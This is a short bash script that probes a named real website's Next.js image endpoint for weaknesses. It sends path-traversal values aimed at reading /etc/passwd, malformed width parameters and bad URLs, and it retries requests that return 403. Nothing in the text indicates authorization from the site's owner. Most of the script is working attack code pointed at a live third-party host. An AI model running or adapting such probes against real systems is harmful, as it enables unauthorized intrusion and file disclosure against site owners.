#!/bin/bash
U="https://www.infinitycapital.bh/_next/image"
HOST="images.ctfassets"".net"
P="/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
enc(){ python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=''))" "$1"; }
get(){ for i in 1 2 3 4 5 6; do c=$(curl -s -o "$2" -w "%{http_code}/%{size_download}/%{content_type}" "$1"); [ "${c:0:3}" != "403" ] && break; done; echo "$c"; }

echo "== legit external image"
E=$(enc "https://$HOST$P")
echo "get => $(get "$U?url=$E&w=1080&q=75" o1.bin)"
file o1.bin; head -c 60 o1.bin | xxd | head -2

echo "== no url param"
echo "get => $(get "$U?w=1080&q=75" o2.bin)"; head -c 200 o2.bin; echo

echo "== local/path traversal url values"
for p in "/etc/passwd" "/@fs/etc/passwd" "../../../../etc/passwd" "/self/../../../../../../etc/passwd" "/static/../../../../etc/passwd"; do
  e=$(enc "$p")
  r=$(get "$U?url=$e&w=1080&q=75" o3.bin)
  echo "$p => $r : $(head -c 120 o3.bin | tr -d '\000' | tr '\n' ' ')"
done

echo "== error body for bad url"
e=$(enc "https://$HOST/nonexistent-zzz.png")
echo "get => $(get "$U?url=$e&w=1080&q=99" o4.bin)"; head -c 300 o4.bin; echo
echo "== invalid w values"
for w in 0 1 999999 abc -1 "640,750"; do
  r=$(get "$U?url=$E&w=$w&q=75" o5.bin); echo "w=$w => $r"
done
